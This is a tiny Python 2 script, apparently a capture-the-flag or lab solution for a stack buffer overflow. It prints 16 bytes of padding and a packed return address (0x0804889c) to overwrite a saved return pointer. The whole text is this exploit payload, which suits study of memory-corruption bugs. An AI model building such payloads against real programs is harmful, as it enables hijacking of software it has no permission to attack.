from struct import pack
toReturn = 0x0804889c
print "A"*16 + pack("<I",toReturn)
